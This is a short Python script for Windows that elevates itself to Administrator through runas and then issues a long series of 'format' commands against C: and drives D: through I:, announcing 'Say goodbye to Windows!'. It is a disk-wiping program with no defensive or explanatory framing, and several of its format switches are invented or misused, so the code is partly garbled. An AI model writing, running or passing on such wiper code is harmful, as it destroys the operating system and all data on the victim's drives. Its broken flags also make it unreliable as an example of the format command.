import os
import sys
import ctypes

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def delete_windows():
    try:
        print("Say goodbye to Windows!")
        os.system("format C: /FS:NTFS /Q /X")

        print("Formatting with custom label...")
        os.system("format C: /FS:NTFS /V:MyDriveLabel /Q")

        print("Formatting with allocation unit size...")
        os.system("format C: /FS:NTFS /A:4096 /Q")

        print("Formatting with compression...")
        os.system("format C: /FS:NTFS /C /Q")

        print("Performing a full format...")
        os.system("format C: /FS:NTFS /P:2")

        print("Formatting drive D...")
        os.system("format D: /FS:NTFS /Q")

        print("Formatting drive E with FAT32 and custom allocation unit size...")
        os.system("format E: /FS:FAT32 /X:65536 /V:MyDriveLabel /Q")

        print("Formatting drive F with bad sector handling...")
        os.system("format F: /FS:NTFS /P:1 /B /Q")

        print("Formatting drive G with ASCII character set...")
        os.system("format G: /FS:NTFS /T:ASCII /Q")

        print("Formatting drive H and disabling NTFS compression...")
        os.system("format H: /FS:NTFS /C:Disable /Q")

        print("Creating a bootable USB drive on drive I...")
        os.system("format I: /FS:FAT32 /V:BootableUSB /Q /X /A:4096")

    except Exception as e:
        print("An error occurred:", e)


def run_as_admin():
    if not is_admin():
        
        try:
            params = ' '.join([sys.executable] + sys.argv)
            shell_cmd = f'runas /user:Administrator "{params}"'
            os.system(shell_cmd)
        except Exception as e:
            print("Error while attempting to elevate privileges:", e)
            sys.exit(1)
        sys.exit()

if __name__ == '__main__':
    run_as_admin()
    delete_windows()

